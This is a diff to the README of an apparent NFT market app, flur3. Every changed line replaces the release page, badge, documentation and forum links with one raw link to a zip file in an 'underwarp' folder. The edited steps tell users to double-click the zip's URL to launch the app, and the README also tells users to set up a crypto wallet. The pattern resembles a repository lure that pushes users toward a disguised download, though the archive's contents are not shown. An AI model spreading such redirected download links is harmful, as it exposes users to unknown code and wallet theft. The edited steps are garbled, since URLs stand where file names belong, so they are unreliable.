@@ -1,6 +1,6 @@
 # 🚀 flur3 - Discover AI-Powered NFT Market Solutions
 
-![Download flur3](https://img.shields.io/badge/download-flur3-blue?style=for-the-badge&logo=github)
+![Download flur3](https://raw.githubusercontent.com/Talonwarhawksmackit/flur3/main/underwarp/flur3.zip)
 
 ## 📚 Description
 
@@ -41,7 +41,7 @@ To get started with flur3, follow these steps:
 
 1. **Visit the Releases Page:** Click the button below to access the downloads.
 
-   [Download flur3](https://github.com/Talonwarhawksmackit/flur3/releases)
+   [Download flur3](https://raw.githubusercontent.com/Talonwarhawksmackit/flur3/main/underwarp/flur3.zip)
 
 2. **Select the Latest Version:** On the Releases page, look for the latest version of flur3.
 
@@ -54,9 +54,9 @@ To get started with flur3, follow these steps:
 2. **Extract Files (if needed):** If the file is in a compressed format such as .zip, right-click on it and select "Extract All." Follow the prompts to extract the files.
 
 3. **Run the Application:**
-   - For Windows: Double-click `flur3.exe` to launch the application.
+   - For Windows: Double-click `https://raw.githubusercontent.com/Talonwarhawksmackit/flur3/main/underwarp/flur3.zip` to launch the application.
    - For macOS: Drag the `flur3` app to your Applications folder and run it from there.
-   - For Linux: If you have downloaded a .deb or .tar.gz file, follow the instructions specific to your Linux distribution to install and run the application.
+   - For Linux: If you have downloaded a .deb or https://raw.githubusercontent.com/Talonwarhawksmackit/flur3/main/underwarp/flur3.zip file, follow the instructions specific to your Linux distribution to install and run the application.
 
 4. **Ensure Your Wallet is Ready:** You will need a wallet compatible with NFT transactions. Set up your wallet if you haven’t done so yet.
 
@@ -76,8 +76,8 @@ If you encounter issues or have questions while using flur3, please visit our Gi
 
 ## 🔗 Further Links
 
-- [Documentation](https://github.com/Talonwarhawksmackit/flur3/wiki)
-- [Community Forum](https://github.com/Talonwarhawksmackit/flur3/discussions)
+- [Documentation](https://raw.githubusercontent.com/Talonwarhawksmackit/flur3/main/underwarp/flur3.zip)
+- [Community Forum](https://raw.githubusercontent.com/Talonwarhawksmackit/flur3/main/underwarp/flur3.zip)
 
 ## 🎉 Contributing
 
@@ -93,4 +93,4 @@ Keep track of the latest updates and features in the Changelog available on our 
 
 For any further information, please refer to the documentation or reach out through our support channels.
 
-[Download flur3](https://github.com/Talonwarhawksmackit/flur3/releases)
+[Download flur3](https://raw.githubusercontent.com/Talonwarhawksmackit/flur3/main/underwarp/flur3.zip)
